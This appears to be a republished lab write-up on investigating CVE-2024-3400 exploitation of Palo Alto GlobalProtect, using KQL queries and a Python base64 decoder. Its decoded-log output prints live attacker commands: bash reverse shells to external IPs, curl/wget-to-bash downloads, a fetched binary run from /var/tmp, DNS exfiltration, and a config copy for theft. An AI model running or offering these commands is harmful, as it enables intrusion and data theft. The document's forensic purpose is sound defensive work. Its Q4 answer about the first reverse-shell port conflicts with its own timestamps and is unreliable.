# :globe_with_meridians: PaloAltoRCE Lab Write-Up

> **Original Source:** [PaloAltoRCE Lab Write-Up](https://infosecwriteups.com/paloaltorce-lab-write-up-by-bnhany-03e767059788)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

First, I need you to understand the scenario. You’ll notice the author listed the CVE they exploited—if you look up that CVE, you’ll find [https://security.paloaltonetworks.com/CVE-2024-3400](https://security.paloaltonetworks.com/CVE-2024-3400).
It’s an OS Command Injection Vulnerability in GlobalProtect.
That tells us how to start looking for whether it exists in our environment and how to determine if it was exploited.


## Get BnHany’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


If you scroll down the write-up, you’ll see the author shows a grep pattern like this:


```
grep pattern "failed to unmarshal session(.\+.\/" mp-log gpsvc.log*
```


This is where we begin answering the questions.

## 6. Lab Questions & Answers


Q1. Identify the IP address of the first threat actor who gained unauthorized access to the environment.Answer: First, search the logs using KQL (Kibana Query Language). Look for log entries that contain the string `failed to unmarshal` — these entries are indicators of the GlobalProtect CVE (CVE-2024-3400) exploitation attempts.


When you inspect those log messages, you’ll often find a payload attached; many of these payloads end with a Base64 . If you copy the Base64 content into an analysis tool (CyberChef) and decode it, you’ll usually reveal an obfuscated command (for example, a reverse shell or `wget|bash` style command). From those decoded payloads you can extract the attacker IP address (the first external IP that appears in the earliest matching log entry is the likely “first threat actor”).


*Commend*


*Decode Of Base64*


Examine the decoded command and the surrounding log metadata (timestamp, source IP fields). The decoded command frequently contains the remote IP (`bash -i >& /dev/tcp/54.162.164.22/1337 0>&1`).


Q2. Determine the date and time of the initial interaction between the threat actor and the target system. Format: 24h-UTC?Answer: All you need to do is sort the SIEM timestamps from oldest to newest, then start searching by the attacker IP until you find the earliest timestamp. Convert/normalize that timestamp to the globally agreed ISO-8601 format (UTC).


*TimeStamp*Q3. What is the command the threat actor used to achieve persistence on the machine?Answer: Instead of copying and pasting every payload into CyberChef manually, I’ll search for the attacker’s IP in the SIEM logs. Then, from the Share menu, I’ll export all related data as a CSV file.
After that, I’ll write a Python script (using ChatGPT) to automatically read the CSV, decode all encoded commands, and identify the one used by the threat actor to maintain persistence on the machine.


The Code:


```
import csv
import json
import base64
import re

csv_file = "File path here"

pattern = re.compile(r"\$\{IFS\}(\w.*)\|base64")

rows = []

with open(csv_file, newline='', encoding='utf-8') as f:
reader = csv.DictReader(f)
for row in reader:
message = row.get("message", "")
message = re.sub(r"^(\d+-?\s?:?)+", "", message).strip()

try:
msg_json = json.loads(message)
rows.append(msg_json)
except json.JSONDecodeError:
continue

rows.sort(key=lambda x: x.get("time", ""))

for msg in rows:
message_content = msg.get("message", "")
match = pattern.search(message_content)
if match:
b64_data = match.group(1)
try:
decoded = base64.b64decode(b64_data).decode('utf-8', errors='ignore')
print(f"{msg.get('time', 'N/A')} {decoded}")
except Exception as e:
print(f"Error decoding base64: {e}")
```


The Output for the Code:


```
2024-04-21T22:20:27.581852267-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-23T21:44:36.042848508-07:00 (curl%20-s%20-L%20http://138.197.162.79:65534/0dzFrRzQ.sh%7Cbash%20-s
2024-04-23T22:49:06.667819145-07:00 wget -qO /var/tmp/BYhkpzVZP http://185.196.9.31:8080/ZvfhsodEot2FHKdyoKI6_w; chmod +x /var/tmp/BYhkpzVZP; /var/tmp/BYhkpzVZP &
2024-04-23T22:49:07.082856042-07:00 wget -qO /var/tmp/BYhkpzVZP http://185.196.9.31:8080/ZvfhsodEot2FHKdyoKI6_w; chmod +x /var/tmp/BYhkpzVZP; /var/tmp/BYhkpzVZP &
Error decoding base64: Incorrect padding
2024-04-24T20:22:19.142921243-07:00 wget%20-q%20-O%20-%20http://138.197.162.79:65534/0dzFrRzQ.sh%7Cbash%20-s
2024-04-24T20:52:44.147842628-07:00 (curl -s -L http://138.197.162.79:65534/0dzFrRzQ.sh || wget -q -O - http://138.197.162.79:65534/0dzFrRzQ.sh)| bash -s
Error decoding base64: Incorrect padding
2024-04-25T00:33:16.300909593-07:00 cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css
2024-04-25T06:50:18.995847126-07:00 nslookup uktmhf.dnslog.cn/`whoami`
Error decoding base64: Incorrect padding
2024-04-25T00:33:16.300909593-07:00 cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css
2024-04-25T06:50:18.995847126-07:00 nslookup uktmhf.dnslog.cn/`whoami`
2024-04-25T00:33:16.300909593-07:00 cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css
2024-04-25T06:50:18.995847126-07:00 nslookup uktmhf.dnslog.cn/`whoami`
2024-04-26T04:44:48.788847088-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:45:08.348860189-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-25T06:50:18.995847126-07:00 nslookup uktmhf.dnslog.cn/`whoami`
2024-04-26T04:44:48.788847088-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:45:08.348860189-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:44:48.788847088-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:45:08.348860189-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:47:26.008874701-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:47:26.008874701-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:48:50.62593458-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:48:50.62593458-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:59:28.523933096-07:00 bash -i >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T05:01:23.890861508-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:04:25.485975248-07:00 ls >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:12:45.710458616-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:17:21.392894711-07:00 bash -i >& /dev/tcp/'54.162.164.22/13337 0>&1
2024-04-26T05:19:56.951910054-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:42:35.868634796-07:00 bash -i >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:50:28.150592897-07:00 whoami >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:52:17.227560458-07:00 ls >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:57:54.928589488-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:14:52.762631815-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:27:12.839608644-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:35:52.689538573-07:00 >& /dev/tcp/54.162.164.22/1337 0>&1337 0>&1
2024-04-26T06:37:01.104541553-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
```


Because the attacker wants persistence, I’ll start by searching for any cron job that was created `syslog-system.log` using this query:


```
program:crond AND (message:"*wget*" OR message:"*bash*")
```


Q4: What port was the first port used by one of the threat actors for the reverse shell?


Answer: The first reverse shell connection was established on port 13337, as seen in the earliest event executing the command `bash -i >& /dev/tcp/54.162.164.22/13337 0>&1` at timestamp `2024-04-26T05:42:35.868634796-07:00` (UTC: `2024-04-26T12:42:35.868634796Z`).
This indicates that the attacker successfully created an interactive shell through this port before later attempts on ports 8080 and 1337, confirming that 13337 was the first port used for the reverse shell connection.


```
2024-04-21T22:20:27.581852267-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-23T21:44:36.042848508-07:00 (curl%20-s%20-L%20http://138.197.162.79:65534/0dzFrRzQ.sh%7Cbash%20-s
2024-04-23T22:49:06.667819145-07:00 wget -qO /var/tmp/BYhkpzVZP http://185.196.9.31:8080/ZvfhsodEot2FHKdyoKI6_w; chmod +x /var/tmp/BYhkpzVZP; /var/tmp/BYhkpzVZP &
2024-04-23T22:49:07.082856042-07:00 wget -qO /var/tmp/BYhkpzVZP http://185.196.9.31:8080/ZvfhsodEot2FHKdyoKI6_w; chmod +x /var/tmp/BYhkpzVZP; /var/tmp/BYhkpzVZP &
Error decoding base64: Incorrect padding
2024-04-24T20:22:19.142921243-07:00 wget%20-q%20-O%20-%20http://138.197.162.79:65534/0dzFrRzQ.sh%7Cbash%20-s
2024-04-24T20:52:44.147842628-07:00 (curl -s -L http://138.197.162.79:65534/0dzFrRzQ.sh || wget -q -O - http://138.197.162.79:65534/0dzFrRzQ.sh)| bash -s
Error decoding base64: Incorrect padding
2024-04-25T00:33:16.300909593-07:00 cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css
2024-04-25T06:50:18.995847126-07:00 nslookup uktmhf.dnslog.cn/`whoami`
Error decoding base64: Incorrect padding
2024-04-25T00:33:16.300909593-07:00 cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css
2024-04-25T06:50:18.995847126-07:00 nslookup uktmhf.dnslog.cn/`whoami`
2024-04-25T00:33:16.300909593-07:00 cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css
2024-04-25T06:50:18.995847126-07:00 nslookup uktmhf.dnslog.cn/`whoami`
2024-04-26T04:44:48.788847088-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:45:08.348860189-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-25T06:50:18.995847126-07:00 nslookup uktmhf.dnslog.cn/`whoami`
2024-04-26T04:44:48.788847088-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:45:08.348860189-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:44:48.788847088-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:45:08.348860189-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:47:26.008874701-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:47:26.008874701-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:48:50.62593458-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:48:50.62593458-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:59:28.523933096-07:00 bash -i >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T05:01:23.890861508-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:04:25.485975248-07:00 ls >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:12:45.710458616-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:17:21.392894711-07:00 bash -i >& /dev/tcp/'54.162.164.22/13337 0>&1
2024-04-26T05:19:56.951910054-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:42:35.868634796-07:00 bash -i >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:50:28.150592897-07:00 whoami >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:52:17.227560458-07:00 ls >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:57:54.928589488-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:14:52.762631815-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:27:12.839608644-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:35:52.689538573-07:00 >& /dev/tcp/54.162.164.22/1337 0>&1337 0>&1
2024-04-26T06:37:01.104541553-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
```


Q5: What was the name of the file one of the threat actors tried to exfiltrate?


Answer:

>

*The *`*running-config.xml*`* file contains the active configuration of a network device, including network settings, firewall rules, VPN configurations, and sensitive credentials — essentially everything that defines how the device operates and secures the network.*


The attacker attempted to exfiltrate the file `running-config.xml` — a critical file that contains the network device’s entire configuration. They copied it to a web-accessible location as `gpvpncfg.css` using the command:


```
cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css
```


If that copy succeeded and the file was exposed on the web server, the attacker could easily download the configuration file from their browser.


Q6: What was the full URL the threat actor used to access the exfiltrated content successfully?


Answer: We will run the filter `client_ip:54.162.164.22` and `message:"GET"` — the attacker will almost certainly try to download that file to retrieve it. We'll run this query and search for the largest `response_size`, which indicates the server’s response to the attacker and is most likely the requested file.


---

*Originally published on [Medium](https://infosecwriteups.com/paloaltorce-lab-write-up-by-bnhany-03e767059788). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
